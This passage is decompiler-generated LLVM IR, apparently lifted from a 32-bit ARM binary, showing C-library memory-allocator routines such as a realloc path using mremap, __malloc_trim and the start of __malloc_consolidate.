  store i32 %v2_13e34, i32* %r3.global-to-local, align 4
  %v2_13e38 = inttoptr i32 %v0_13df0 to i32*
  store i32 %v2_13e34, i32* %v2_13e38, align 4
  %v0_13e3c = load i32, i32* @r5, align 4
  %v1_13e3c = add i32 %v0_13e3c, 4
  %v2_13e3c = inttoptr i32 %v1_13e3c to i32*
  %v3_13e3c = load i32, i32* %v2_13e3c, align 4
  store i32 %v3_13e3c, i32* %r3.global-to-local, align 4
  %v1_13e40 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e40 = add i32 %v1_13e40, 4
  %v3_13e40 = inttoptr i32 %v2_13e40 to i32*
  store i32 %v3_13e3c, i32* %v3_13e40, align 4
  %v0_13e44 = load i32, i32* @r5, align 4
  %v1_13e44 = add i32 %v0_13e44, 8
  %v2_13e44 = inttoptr i32 %v1_13e44 to i32*
  %v3_13e44 = load i32, i32* %v2_13e44, align 4
  store i32 %v3_13e44, i32* %r3.global-to-local, align 4
  %v0_13e48 = load i32, i32* @ip, align 4
  %v1_13e4c = load i32, i32* %r1.global-to-local, align 4
  %v2_13e4c = add i32 %v1_13e4c, 8
  %v3_13e4c = inttoptr i32 %v2_13e4c to i32*
  store i32 %v3_13e44, i32* %v3_13e4c, align 4
  %tmp39 = icmp ult i32 %v0_13e48, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_13e54

dec_label_pc_13e54:                               ; preds = %dec_label_pc_13e34
  %v0_13e54 = load i32, i32* @r5, align 4
  %v1_13e54 = add i32 %v0_13e54, 12
  %v2_13e54 = inttoptr i32 %v1_13e54 to i32*
  %v3_13e54 = load i32, i32* %v2_13e54, align 4
  store i32 %v3_13e54, i32* %r3.global-to-local, align 4
  %v1_13e58 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e58 = add i32 %v1_13e58, 12
  %v3_13e58 = inttoptr i32 %v2_13e58 to i32*
  store i32 %v3_13e54, i32* %v3_13e58, align 4
  %v0_13e5c = load i32, i32* @r5, align 4
  %v1_13e5c = add i32 %v0_13e5c, 16
  %v2_13e5c = inttoptr i32 %v1_13e5c to i32*
  %v3_13e5c = load i32, i32* %v2_13e5c, align 4
  store i32 %v3_13e5c, i32* %r3.global-to-local, align 4
  %v0_13e60 = load i32, i32* @ip, align 4
  %v1_13e64 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e64 = add i32 %v1_13e64, 16
  %v3_13e64 = inttoptr i32 %v2_13e64 to i32*
  store i32 %v3_13e5c, i32* %v3_13e64, align 4
  %tmp40 = icmp ult i32 %v0_13e60, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_13e6c

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e54
  %v0_13e6c = load i32, i32* @r5, align 4
  %v1_13e6c = add i32 %v0_13e6c, 20
  %v2_13e6c = inttoptr i32 %v1_13e6c to i32*
  %v3_13e6c = load i32, i32* %v2_13e6c, align 4
  store i32 %v3_13e6c, i32* %r3.global-to-local, align 4
  %v1_13e70 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e70 = add i32 %v1_13e70, 20
  %v3_13e70 = inttoptr i32 %v2_13e70 to i32*
  store i32 %v3_13e6c, i32* %v3_13e70, align 4
  %v0_13e74 = load i32, i32* @r5, align 4
  %v1_13e74 = add i32 %v0_13e74, 24
  %v2_13e74 = inttoptr i32 %v1_13e74 to i32*
  %v3_13e74 = load i32, i32* %v2_13e74, align 4
  store i32 %v3_13e74, i32* %r3.global-to-local, align 4
  %v1_13e78 = load i32, i32* %r1.global-to-local, align 4
  %v2_13e78 = add i32 %v1_13e78, 24
  %v3_13e78 = inttoptr i32 %v2_13e78 to i32*
  store i32 %v3_13e74, i32* %v3_13e78, align 4
  %v0_13e7c = load i32, i32* @ip, align 4
  %v7_13e7c = icmp eq i32 %v0_13e7c, 9
  br i1 %v7_13e7c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_13e6c
  %v1_13e80 = load i32, i32* @r5, align 4
  %v2_13e80 = add i32 %v1_13e80, 28
  %v3_13e80 = inttoptr i32 %v2_13e80 to i32*
  %v4_13e80 = load i32, i32* %v3_13e80, align 4
  store i32 %v4_13e80, i32* %r3.global-to-local, align 4
  %v2_13e84 = load i32, i32* %r1.global-to-local, align 4
  %v3_13e84 = add i32 %v2_13e84, 28
  %v4_13e84 = inttoptr i32 %v3_13e84 to i32*
  store i32 %v4_13e80, i32* %v4_13e84, align 4
  %v1_13e88 = load i32, i32* @r5, align 4
  %v2_13e88 = add i32 %v1_13e88, 32
  %v3_13e88 = inttoptr i32 %v2_13e88 to i32*
  %v4_13e88 = load i32, i32* %v3_13e88, align 4
  store i32 %v4_13e88, i32* %r3.global-to-local, align 4
  %v2_13e8c = load i32, i32* %r1.global-to-local, align 4
  %v3_13e8c = add i32 %v2_13e8c, 32
  %v4_13e8c = inttoptr i32 %v3_13e8c to i32*
  store i32 %v4_13e88, i32* %v4_13e8c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_13e6c, %dec_label_pc_13e54, %dec_label_pc_13e34, %dec_label_pc_13e28, %bb32
  %v0_13e90 = load i32, i32* @r5, align 4
  store i32 %v0_13e90, i32* @r0, align 4
  %v0_13e94 = call i32 @free()
  store i32 %v0_13e94, i32* %r0.global-to-local, align 4
  %v0_13e98 = load i32, i32* @r7, align 4
  %v1_13e98 = add i32 %v0_13e98, 8
  store i32 %v1_13e98, i32* @r4, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13ea0:                               ; preds = %bb30, %.thread2, %dec_label_pc_13de0
  %v0_13eb4 = phi i32 [ %v3_13e10, %.thread2 ], [ %v1_13d28, %bb30 ], [ %v1_13ea0.pre, %dec_label_pc_13de0 ]
  %v0_13ea0 = load i32, i32* @sb, align 4
  %v2_13ea0 = sub i32 %v0_13eb4, %v0_13ea0
  store i32 %v2_13ea0, i32* %r1.global-to-local, align 4
  %v0_13ea8 = load i32, i32* @sl, align 4
  %v1_13ea8 = add i32 %v0_13ea8, 4
  %v2_13ea8 = inttoptr i32 %v1_13ea8 to i32*
  %v3_13ea8 = load i32, i32* %v2_13ea8, align 4
  %tmp41 = icmp ugt i32 %v2_13ea0, 15
  %v1_13ed0 = urem i32 %v3_13ea8, 2
  store i32 %v1_13ed0, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_13ed0, label %dec_label_pc_13eb0

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea0
  %v2_13eb4 = or i32 %v1_13ed0, %v0_13eb4
  store i32 %v2_13eb4, i32* %r3.global-to-local, align 4
  store i32 %v2_13eb4, i32* %v2_13ea8, align 4
  %v0_13ebc = load i32, i32* @sl, align 4
  %v1_13ebc = load i32, i32* %r0.global-to-local, align 4
  %v2_13ebc = add i32 %v1_13ebc, %v0_13ebc
  store i32 %v2_13ebc, i32* %r2.global-to-local, align 4
  %v1_13ec0 = add i32 %v2_13ebc, 4
  %v2_13ec0 = inttoptr i32 %v1_13ec0 to i32*
  %v3_13ec0 = load i32, i32* %v2_13ec0, align 4
  %v1_13ec4 = or i32 %v3_13ec0, 1
  store i32 %v1_13ec4, i32* %r3.global-to-local, align 4
  store i32 %v1_13ec4, i32* %v2_13ec0, align 4
  br label %dec_label_pc_13f00

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13ea0
  %v2_13ed4 = add i32 %v0_13ea8, %v0_13ea0
  store i32 %v2_13ed4, i32* %r0.global-to-local, align 4
  %v2_13ed8 = or i32 %v1_13ed0, %v0_13ea0
  store i32 %v2_13ed8, i32* %r3.global-to-local, align 4
  %v1_13edc = or i32 %v2_13ea0, 1
  store i32 %v1_13edc, i32* %r2.global-to-local, align 4
  store i32 %v2_13ed8, i32* %v2_13ea8, align 4
  %v0_13ee4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ee4 = load i32, i32* %r0.global-to-local, align 4
  %v2_13ee4 = add i32 %v1_13ee4, 4
  %v3_13ee4 = inttoptr i32 %v2_13ee4 to i32*
  store i32 %v0_13ee4, i32* %v3_13ee4, align 4
  %v0_13ee8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ee8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13ee8 = add i32 %v1_13ee8, %v0_13ee8
  store i32 %v2_13ee8, i32* %r2.global-to-local, align 4
  %v1_13eec = add i32 %v2_13ee8, 4
  %v2_13eec = inttoptr i32 %v1_13eec to i32*
  %v3_13eec = load i32, i32* %v2_13eec, align 4
  %v1_13ef0 = or i32 %v3_13eec, 1
  store i32 %v1_13ef0, i32* %r3.global-to-local, align 4
  store i32 %v1_13ef0, i32* %v2_13eec, align 4
  %v0_13ef8 = load i32, i32* %r0.global-to-local, align 4
  %v1_13ef8 = add i32 %v0_13ef8, 8
  store i32 %v1_13ef8, i32* @r0, align 4
  %v0_13efc = call i32 @free()
  store i32 %v0_13efc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13f00

dec_label_pc_13f00:                               ; preds = %dec_label_pc_13eb0, %dec_label_pc_13ed0
  %v0_13f00 = load i32, i32* @sl, align 4
  %v1_13f00 = add i32 %v0_13f00, 8
  store i32 %v1_13f00, i32* @r4, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13f08:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r1.global-to-local, align 4
  %v4_13f10 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 64) to i32*), align 4
  store i32 %v4_13f10, i32* @r8, align 4
  %v2_13f14 = inttoptr i32 %v1_13d24 to i32*
  %v3_13f14 = load i32, i32* %v2_13f14, align 4
  store i32 %v3_13f14, i32* @r4, align 4
  %v1_13f18 = add i32 %v4_13f10, 860
  %v2_13f18 = inttoptr i32 %v1_13f18 to i32*
  %v3_13f18 = load i32, i32* %v2_13f18, align 4
  %v1_13f1c = add i32 %v3_13f14, 4
  %v1_13f20 = add i32 %v3_13f18, -1
  store i32 %v1_13f20, i32* %r2.global-to-local, align 4
  %v2_13f24 = add i32 %v1_13f1c, %v1_13f20
  %v1_13f28 = load i32, i32* @sb, align 4
  %v2_13f28 = add i32 %v2_13f24, %v1_13f28
  store i32 %v2_13f28, i32* %r3.global-to-local, align 4
  %v2_13f2c = sub i32 0, %v3_13f18
  %v3_13f2c = and i32 %v2_13f28, %v2_13f2c
  store i32 %v3_13f2c, i32* @r7, align 4
  %v2_13f30 = sub i32 %v3_13f2c, %v3_13f14
  store i32 %v2_13f30, i32* @fp, align 4
  %v9_13f34 = icmp eq i32 %v1_13d28, %v2_13f30
  br i1 %v9_13f34, label %dec_label_pc_13fa8, label %dec_label_pc_13f3c

dec_label_pc_13f3c:                               ; preds = %dec_label_pc_13f08
  %v2_13f3c = sub i32 %v1_13d24, %v3_13f14
  store i32 %v2_13f3c, i32* %r0.global-to-local, align 4
  %v2_13f40 = add i32 %v3_13f14, %v1_13d28
  store i32 %v2_13f40, i32* %r1.global-to-local, align 4
  store i32 %v3_13f2c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_13f4c = call i32 @mremap(i32 %v2_13f3c, i32 %v2_13f40, i32 %v3_13f2c, i32 1)
  store i32 %v4_13f4c, i32* %r0.global-to-local, align 4
  %v7_13f50 = icmp eq i32 %v4_13f4c, -1
  br i1 %v7_13f50, label %dec_label_pc_13f9c, label %dec_label_pc_13f58

dec_label_pc_13f58:                               ; preds = %dec_label_pc_13f3c
  %v1_13f58 = load i32, i32* @r4, align 4
  %v2_13f58 = add i32 %v1_13f58, %v4_13f4c
  store i32 %v2_13f58, i32* %r0.global-to-local, align 4
  %v0_13f5c = load i32, i32* @fp, align 4
  %v1_13f5c = or i32 %v0_13f5c, 2
  store i32 %v1_13f5c, i32* %r3.global-to-local, align 4
  %v2_13f60 = add i32 %v2_13f58, 4
  %v3_13f60 = inttoptr i32 %v2_13f60 to i32*
  store i32 %v1_13f5c, i32* %v3_13f60, align 4
  %v0_13f64 = load i32, i32* @r8, align 4
  %v1_13f64 = add i32 %v0_13f64, 868
  %v2_13f64 = inttoptr i32 %v1_13f64 to i32*
  %v3_13f64 = load i32, i32* %v2_13f64, align 4
  store i32 %v3_13f64, i32* %r3.global-to-local, align 4
  %v1_13f68 = add i32 %v0_13f64, 880
  %v2_13f68 = inttoptr i32 %v1_13f68 to i32*
  %v3_13f68 = load i32, i32* %v2_13f68, align 4
  store i32 %v3_13f68, i32* %r2.global-to-local, align 4
  %v0_13f6c = load i32, i32* @r6, align 4
  %v2_13f6c = sub i32 %v3_13f64, %v0_13f6c
  store i32 %v2_13f6c, i32* %r3.global-to-local, align 4
  %v1_13f70 = load i32, i32* @r7, align 4
  %v2_13f70 = add i32 %v1_13f70, %v2_13f6c
  store i32 %v2_13f70, i32* %r1.global-to-local, align 4
  %v1_13f74 = add i32 %v0_13f64, 872
  %v2_13f74 = inttoptr i32 %v1_13f74 to i32*
  %v3_13f74 = load i32, i32* %v2_13f74, align 4
  store i32 %v3_13f74, i32* %r3.global-to-local, align 4
  %v1_13f7c = add i32 %v0_13f64, 884
  %v2_13f7c = inttoptr i32 %v1_13f7c to i32*
  %v3_13f7c = load i32, i32* %v2_13f7c, align 4
  store i32 %v3_13f7c, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_13f70, %v3_13f68
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_13f58
  store i32 %v2_13f70, i32* %v2_13f68, align 4
  %v0_13f84.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13f84.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_13f58, %bb33
  %v1_13f84 = phi i32 [ %v0_13f64, %dec_label_pc_13f58 ], [ %v1_13f84.pre, %bb33 ]
  %v0_13f84 = phi i32 [ %v2_13f70, %dec_label_pc_13f58 ], [ %v0_13f84.pre, %bb33 ]
  %v2_13f84 = add i32 %v1_13f84, 868
  %v3_13f84 = inttoptr i32 %v2_13f84 to i32*
  store i32 %v0_13f84, i32* %v3_13f84, align 4
  %v0_13f88 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f88 = load i32, i32* %r3.global-to-local, align 4
  %v2_13f88 = add i32 %v1_13f88, %v0_13f88
  store i32 %v2_13f88, i32* %r1.global-to-local, align 4
  %v1_13f8c = load i32, i32* %r2.global-to-local, align 4
  %v0_13f90 = load i32, i32* %r0.global-to-local, align 4
  %v1_13f90 = add i32 %v0_13f90, 8
  store i32 %v1_13f90, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_13f88, %v1_13f8c
  br i1 %tmp43, label %bb35, label %dec_label_pc_13fd4

bb35:                                             ; preds = %bb34
  %v5_13f94 = load i32, i32* @r8, align 4
  %v6_13f94 = add i32 %v5_13f94, 884
  %v7_13f94 = inttoptr i32 %v6_13f94 to i32*
  store i32 %v2_13f88, i32* %v7_13f94, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13f9c:                               ; preds = %dec_label_pc_13f3c
  %v0_13f9c = load i32, i32* @sb, align 4
  %v1_13f9c = add i32 %v0_13f9c, 4
  store i32 %v1_13f9c, i32* %r3.global-to-local, align 4
  %v0_13fa0 = load i32, i32* @r6, align 4
  %v3_13fa0 = icmp ult i32 %v0_13fa0, %v1_13f9c
  br i1 %v3_13fa0, label %dec_label_pc_13fb0, label %dec_label_pc_13f9c.dec_label_pc_13fa8_crit_edge

dec_label_pc_13f9c.dec_label_pc_13fa8_crit_edge:  ; preds = %dec_label_pc_13f9c
  %v0_13fa8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13fa8

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f9c.dec_label_pc_13fa8_crit_edge, %dec_label_pc_13f08
  %v0_13fa8 = phi i32 [ %v0_13fa8.pre, %dec_label_pc_13f9c.dec_label_pc_13fa8_crit_edge ], [ %v0_13d10, %dec_label_pc_13f08 ]
  store i32 %v0_13fa8, i32* @r4, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13fb0:                               ; preds = %dec_label_pc_13f9c
  %v1_13fb0 = add i32 %v0_13f9c, -7
  store i32 %v1_13fb0, i32* @r0, align 4
  %v0_13fb4 = call i32 @malloc()
  store i32 %v0_13fb4, i32* @r0, align 4
  store i32 %v0_13fb4, i32* @r4, align 4
  %v2_13fb8 = icmp eq i32 %v0_13fb4, 0
  br i1 %v2_13fb8, label %dec_label_pc_13fd4, label %dec_label_pc_13fc0

dec_label_pc_13fc0:                               ; preds = %dec_label_pc_13fb0
  %v0_13fc0 = load i32, i32* @r6, align 4
  %v1_13fc0 = add i32 %v0_13fc0, -8
  store i32 %v1_13fc0, i32* @r2, align 4
  %v0_13fc4 = load i32, i32* @r5, align 4
  store i32 %v0_13fc4, i32* @r1, align 4
  %v0_13fc8 = call i32 @memcpy()
  %v0_13fcc = load i32, i32* @r5, align 4
  store i32 %v0_13fcc, i32* @r0, align 4
  %v0_13fd0 = call i32 @free()
  store i32 %v0_13fd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13fd4

dec_label_pc_13fd4:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_13fb0, %dec_label_pc_13fa8, %dec_label_pc_13f00, %.thread6, %dec_label_pc_13d70, %dec_label_pc_13fc0
  store i32 %v2_13cbc, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* %r2.global-to-local, align 4
  %v4_13fe4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.366 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13fe4)
  br label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13cf0, %dec_label_pc_13c98, %dec_label_pc_13c80, %dec_label_pc_13fd4
  %v0_13ff0 = load i32, i32* @r4, align 4
  store i32 %v0_13ff0, i32* %r0.global-to-local, align 4
  store i32 %v3_13c60, i32* @r4, align 4
  store i32 %v6_13c60, i32* @r5, align 4
  store i32 %v9_13c60, i32* @r6, align 4
  store i32 %v12_13c60, i32* @r7, align 4
  store i32 %v15_13c60, i32* @r8, align 4
  store i32 %v18_13c60, i32* @sb, align 4
  store i32 %v21_13c60, i32* @sl, align 4
  store i32 %v24_13c60, i32* @fp, align 4
  store i32 %v27_13c60, i32* @lr, align 4
  ret i32 %v0_13ff0

; uselistorder directives
  uselistorder i32 %v2_13f88, { 1, 0, 2 }
  uselistorder i32 %v2_13f70, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13f4c, { 1, 0, 2 }
  uselistorder i32 %v3_13f2c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13ed0, { 2, 1, 0 }
  uselistorder i32 %v2_13ea0, { 1, 0, 2 }
  uselistorder i32 %v0_13e34, { 1, 0 }
  uselistorder i32 %v0_13df0, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_13d54, { 0, 2, 1, 3 }
  uselistorder i32 %v2_13d4c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_13d30, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_13d28, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_13d24, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_13d14, { 1, 0 }
  uselistorder i32 %v0_13d10, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13ce8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_13ff0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_13fd4, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_13f00, { 1, 0 }
  uselistorder label %dec_label_pc_13ea0, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13dec, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13de0, { 1, 0 }
  uselistorder label %dec_label_pc_13ddc, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_14004(i32 %arg1) local_unnamed_addr {
dec_label_pc_14004:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14004 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14004, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_14004
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_14018.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14018.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_1401c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_14004, %bb
  %v4_1401c = phi i32 [ %v4_1401c.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_14004 ], [ 0, %bb ]
  ret i32 %v4_1401c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_14020 = add i32 %arg2, 44
  %v2_14020 = inttoptr i32 %v1_14020 to i32*
  %v3_14020 = load i32, i32* %v2_14020, align 4
  %v12_14024 = load i32, i32* @r7, align 4
  %v1_14028 = add i32 %v3_14020, 4
  %v2_14028 = inttoptr i32 %v1_14028 to i32*
  %v3_14028 = load i32, i32* %v2_14028, align 4
  %v1_1402c = add i32 %arg2, 860
  %v2_1402c = inttoptr i32 %v1_1402c to i32*
  %v3_1402c = load i32, i32* %v2_1402c, align 4
  store i32 %v3_1402c, i32* @r4, align 4
  %v1_14030 = and i32 %v3_14028, -4
  store i32 %v1_14030, i32* @r6, align 4
  %v1_14034 = add i32 %v1_14030, -17
  %v2_14038 = add i32 %v1_14034, %v3_1402c
  store i32 %arg2, i32* @r5, align 4
  %v2_14044 = sub i32 %v2_14038, %arg1
  store i32 %v3_1402c, i32* %r1.global-to-local, align 4
  %v2_1404c = udiv i32 %v2_14044, %v3_1402c
  %v1_14050 = add i32 %v2_1404c, -1
  store i32 %v1_14050, i32* %r0.global-to-local, align 4
  %v2_14054 = mul i32 %v1_14050, %v3_1402c
  store i32 %v2_14054, i32* @r7, align 4
  %v2_14058 = icmp eq i32 %v2_14054, 0
  store i1 %v2_14058, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_14054, 1
  br i1 %tmp8, label %dec_label_pc_140c0, label %dec_label_pc_14060

dec_label_pc_14060:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14064 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14064, i32* %r0.global-to-local, align 4
  %v0_14068 = load i32, i32* @r5, align 4
  %v1_14068 = add i32 %v0_14068, 44
  %v2_14068 = inttoptr i32 %v1_14068 to i32*
  %v3_14068 = load i32, i32* %v2_14068, align 4
  %v0_1406c = load i32, i32* @r6, align 4
  %v2_1406c = add i32 %v0_1406c, %v3_14068
  %v9_14070 = icmp eq i32 %v1_14064, %v2_1406c
  store i1 %v9_14070, i1* @cpsr_z, align 1
  store i32 %v1_14064, i32* @r4, align 4
  br i1 %v9_14070, label %dec_label_pc_1407c, label %dec_label_pc_140c0

dec_label_pc_1407c:                               ; preds = %dec_label_pc_14060
  %v0_1407c = load i32, i32* @r7, align 4
  %v1_1407c = sub i32 0, %v0_1407c
  store i32 %v1_1407c, i32* %r0.global-to-local, align 4
  %v1_14080 = call i32 @__GI_sbrk(i32 %v1_1407c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_14088 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_14088, i32* %r0.global-to-local, align 4
  %v7_1408c = icmp eq i32 %v1_14088, -1
  store i1 %v7_1408c, i1* @cpsr_z, align 1
  br i1 %v7_1408c, label %dec_label_pc_140c0, label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %dec_label_pc_1407c
  %v0_14094 = load i32, i32* @r4, align 4
  %v2_14094 = sub i32 %v0_14094, %v1_14088
  store i32 %v2_14094, i32* %r0.global-to-local, align 4
  %v9_14094 = icmp eq i32 %v0_14094, %v1_14088
  store i1 %v9_14094, i1* @cpsr_z, align 1
  br i1 %v9_14094, label %dec_label_pc_140c0, label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %dec_label_pc_14094
  %v0_1409c = load i32, i32* @r5, align 4
  %v1_1409c = add i32 %v0_1409c, 872
  %v2_1409c = inttoptr i32 %v1_1409c to i32*
  %v3_1409c = load i32, i32* %v2_1409c, align 4
  %v1_140a0 = load i32, i32* @r6, align 4
  %v2_140a0 = sub i32 %v1_140a0, %v2_14094
  store i32 %v2_140a0, i32* %r2.global-to-local, align 4
  %v1_140a4 = add i32 %v0_1409c, 44
  %v2_140a4 = inttoptr i32 %v1_140a4 to i32*
  %v3_140a4 = load i32, i32* %v2_140a4, align 4
  store i32 %v3_140a4, i32* %r1.global-to-local, align 4
  %v2_140a8 = sub i32 %v3_1409c, %v2_14094
  %v1_140ac = or i32 %v2_140a0, 1
  store i32 %v1_140ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_140a8, i32* %v2_1409c, align 4
  %v0_140b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_140b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_140b8 = add i32 %v1_140b8, 4
  %v3_140b8 = inttoptr i32 %v2_140b8 to i32*
  store i32 %v0_140b8, i32* %v3_140b8, align 4
  %v1_140cc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c0:                               ; preds = %dec_label_pc_14060, %dec_label_pc_14094, %dec_label_pc_1407c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_1409c, %dec_label_pc_140c0
  %v1_140cc = phi i32 [ %v1_140cc.pre, %dec_label_pc_1409c ], [ 0, %dec_label_pc_140c0 ]
  store i32 %v12_14024, i32* @r7, align 4
  ret i32 %v1_140cc

; uselistorder directives
  uselistorder i1 %v7_1408c, { 1, 0 }
  uselistorder i32 %v1_14088, { 2, 1, 0, 3 }
  uselistorder i32 %v3_1402c, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_140c4, { 1, 0 }
  uselistorder label %dec_label_pc_140c0, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_140d0 = load i32, i32* @r4, align 4
  store i32 %v3_140d0, i32* %stack_var_-36, align 4
  %v0_140d4 = load i32, i32* @r0, align 4
  %v1_140d4 = inttoptr i32 %v0_140d4 to i32*
  %v2_140d4 = load i32, i32* %v1_140d4, align 4
  store i32 %v2_140d4, i32* %r3.global-to-local, align 4
  %v2_140d8 = icmp eq i32 %v2_140d4, 0
  store i32 %v0_140d4, i32* @r4, align 4
  br i1 %v2_140d8, label %dec_label_pc_14210.preheader, label %dec_label_pc_140ec

dec_label_pc_14210.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1421825 = add i32 %v0_140d4, 52
  store i32 %v1_1421825, i32* %r3.global-to-local, align 4
  %v2_1422026 = add i32 %v0_140d4, 60
  %v3_1422027 = inttoptr i32 %v2_1422026 to i32*
